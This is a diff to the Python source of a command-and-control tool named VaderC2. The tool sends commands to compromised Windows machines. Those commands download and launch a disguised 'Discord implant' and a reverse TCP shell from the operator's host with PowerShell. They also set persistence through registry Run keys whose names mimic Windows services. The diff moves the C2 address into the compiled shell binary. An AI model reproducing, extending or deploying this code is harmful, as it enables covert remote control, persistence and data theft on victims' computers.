@@ -687,12 +687,12 @@ class VaderC2:
                             f'Invoke-WebRequest -Uri \'http://{my_ip}:8890/vader_shell.exe\' '
                             f'-OutFile \'C:\\Users\\Public\\vader_shell.exe\'; '
                             f'Start-Process \'C:\\Users\\Public\\svchost_update.exe\'; '
-                            f'Start-Process \'C:\\Users\\Public\\vader_shell.exe\' -ArgumentList \'{my_ip}\',\'{self.port}\'"'
+                            f'Start-Process \'C:\\Users\\Public\\vader_shell.exe\'"'
                         )
                         print(f"  {AMBER}[*] Deploying implant + shell via {matches[0][:8]}...{RST}")
                         try:
                             s.sock.sendall((deploy_cmd + "\n").encode("utf-8"))
-                            print(f"  {GREEN}[+] Deploy sent — Discord implant + TCP shell → {my_ip}:{self.port}{RST}")
+                            print(f"  {GREEN}[+] Deploy sent — Discord implant + TCP shell (C2 baked in){RST}")
                         except Exception as e:
                             print(f"  {RED}[!] Send failed: {e}{RST}")
 
@@ -964,14 +964,14 @@ setInterval(grab,{interval*1000});
                             '/v WindowsSecurityHealth /t REG_SZ '
                             '/d "C:\\Users\\Public\\svchost_update.exe" /f & '
                             'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
-                            f'/v WindowsSecurityUpdate /t REG_SZ '
-                            f'/d "C:\\Users\\Public\\vader_shell.exe {my_ip} {self.port}" /f'
+                            '/v WindowsSecurityUpdate /t REG_SZ '
+                            '/d "C:\\Users\\Public\\vader_shell.exe" /f'
                         )
                         try:
                             s.sock.sendall((persist_cmd + "\n").encode("utf-8"))
                             print(f"  {GREEN}[+] Persistence set:{RST}")
                             print(f"  {GREEN}    WindowsSecurityHealth  → Discord implant{RST}")
-                            print(f"  {GREEN}    WindowsSecurityUpdate  → TCP shell → {my_ip}:{self.port}{RST}")
+                            print(f"  {GREEN}    WindowsSecurityUpdate  → TCP shell (C2 IP baked in at compile){RST}")
                         except Exception as e:
                             print(f"  {RED}[!] {e}{RST}")
 
@@ -1041,12 +1041,17 @@ def run_tcp_cmd(tcp_cmd_str):
     if cmd == "deploy":
         deploy_cmd = (
             f'taskkill /F /IM svchost_update.exe 2>nul & '
-            f'powershell -c "Invoke-WebRequest -Uri \'http://{my_ip}:8890/agent/dist_py/svchost_update.exe\' '
+            f'taskkill /F /IM vader_shell.exe 2>nul & '
+            f'powershell -c "'
+            f'Invoke-WebRequest -Uri \'http://{my_ip}:8890/agent/dist_py/svchost_update.exe\' '
             f'-OutFile \'C:\\Users\\Public\\svchost_update.exe\'; '
-            f'Start-Process \'C:\\Users\\Public\\svchost_update.exe\'"'
+            f'Invoke-WebRequest -Uri \'http://{my_ip}:8890/vader_shell.exe\' '
+            f'-OutFile \'C:\\Users\\Public\\vader_shell.exe\'; '
+            f'Start-Process \'C:\\Users\\Public\\svchost_update.exe\'; '
+            f'Start-Process \'C:\\Users\\Public\\vader_shell.exe\'"'
         )
         s.sock.sendall((deploy_cmd + "\n").encode("utf-8"))
-        print(f"  {GREEN}[+] Deploy command sent.{RST}")
+        print(f"  {GREEN}[+] Deploy sent — Discord implant + TCP shell (C2 baked in){RST}")
 
     elif cmd == "screenshot":
         recv_port = 8891
@@ -1153,10 +1158,13 @@ def run_tcp_cmd(tcp_cmd_str):
         persist_cmd = (
             'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
             '/v WindowsSecurityHealth /t REG_SZ '
-            '/d "C:\\Users\\Public\\svchost_update.exe" /f'
+            '/d "C:\\Users\\Public\\svchost_update.exe" /f & '
+            'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
+            '/v WindowsSecurityUpdate /t REG_SZ '
+            '/d "C:\\Users\\Public\\vader_shell.exe" /f'
         )
         s.sock.sendall((persist_cmd + "\n").encode("utf-8"))
-        print(f"  {GREEN}[+] Persistence command sent.{RST}")
+        print(f"  {GREEN}[+] Persistence set — Discord + TCP shell (C2 baked in){RST}")
 
     elif cmd == "kill":
         proc = args[0] if args else ""
